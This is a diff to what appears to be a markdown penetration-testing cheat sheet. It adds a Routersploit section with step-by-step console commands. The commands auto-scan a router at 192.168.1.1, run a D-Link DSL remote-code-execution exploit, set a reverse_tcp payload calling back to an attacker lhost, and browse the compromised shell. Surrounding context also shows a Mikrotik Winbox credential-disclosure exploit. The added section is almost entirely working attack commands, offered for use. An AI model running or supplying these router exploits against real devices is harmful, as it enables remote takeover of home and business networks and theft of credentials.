@@ -102,8 +102,6 @@ iptables -I INPUT -p tcp --dport 80 -m connlimit --connlimit-above 20 --connlimi
 ## Routersploit
 Exploit For Router HGU, Mikrotik, IPCAM, etc.
 
-Source : https://github.com/threat9/routersploit
-
 Case Router ZTE_F609 and ZTE_F660
 ```
 show exploits
@@ -121,6 +119,34 @@ use exploits/routers/mikrotik/winbox_auth_bypass_creds_disclosure
 show options
 set target [IP_TARGET]
 exploit
+```
+
+## Routersploit 3.0
+Source : https://github.com/threat9/routersploit
+
+Running Framework
+```
+python3 rsf.py
+```
+Lets Exploit
+```
+use scanners/autopwm
+set target 192.168.1.1 <- IP Routers
+run
+
+use exploits/routers/dlink/dsl_rce
+set target 192.168.1.1
+check 
+run
+
+show payloads
+set payload reverse_tcp
+show options
+set lhost 192.168.1.xx <- IP Attacker
+run
+
+ls -la
+exit
 ```
 
 # Scanning Port and Service
